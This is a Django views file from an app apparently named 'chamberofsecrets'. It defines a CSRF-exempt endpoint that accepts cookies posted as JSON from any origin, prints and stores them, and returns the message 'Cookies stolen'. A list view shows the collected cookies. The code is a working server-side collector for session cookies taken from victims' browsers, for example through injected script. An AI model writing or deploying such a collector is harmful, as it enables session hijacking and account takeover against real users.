from django.views import generic
import json
from django.http import JsonResponse
from .models import Cookies

from django.views.decorators.csrf import csrf_exempt
from django.utils.decorators import method_decorator

@method_decorator(csrf_exempt, name="dispatch")
class CookiesView(generic.ListView):
    template_name = 'chamberofsecrets/cookies.html'
    context_object_name = 'cookies'
    model = Cookies

    def post(self, request, *args, **kwargs):
        try:
            data = json.loads(request.body.decode('utf-8'))
            cookies = data.get('cookies')
            print(cookies)
            if cookies:
                Cookies.objects.create(cookies=cookies)
                return JsonResponse({'status': 'success', 'message': 'Cookies stolen'}, status=201)
            else:
                return JsonResponse({'status': 'error', 'message': 'No cookies provided'}, status=400)
        except json.JSONDecodeError:
            return JsonResponse({'status': 'error', 'message': 'Invalid JSON data'}, status=400)